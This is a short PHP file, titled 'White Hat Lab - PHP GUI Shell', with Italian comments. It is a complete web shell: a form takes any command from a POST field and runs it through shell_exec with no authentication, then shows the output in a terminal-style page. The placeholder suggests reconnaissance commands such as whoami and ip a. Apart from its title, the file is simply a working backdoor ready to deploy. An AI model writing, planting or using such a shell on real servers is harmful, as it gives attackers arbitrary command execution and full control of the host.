<?php
// Logica di esecuzione
$output = "";
if (isset($_POST['command'])) {
    // Esegue il comando e cattura l'output (stderr incluso)
    $command = $_POST['command'];
    $output = shell_exec($command . " 2>&1");
}
?>

<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>White Hat Lab - PHP GUI Shell</title>
    <style>
        body { background-color: #1e1e1e; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 900px; margin: auto; }
        textarea { width: 100%; height: 400px; background: #000; color: #00ff00; border: 1px solid #444; padding: 10px; margin-bottom: 10px; }
        input[type="text"] { width: 80%; padding: 10px; background: #333; color: #fff; border: 1px solid #555; }
        button { padding: 10px 20px; cursor: pointer; background: #00ff00; color: #000; border: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Remote Terminal Console</h2>
        <textarea readonly><?php echo htmlspecialchars($output); ?></textarea>
        
        <form method="POST">
            <input type="text" name="command" placeholder="Inserisci comando (es: ls -la, whoami, ip a)" autofocus>
            <button type="submit">Esegui</button>
        </form>
    </div>
</body>
</html>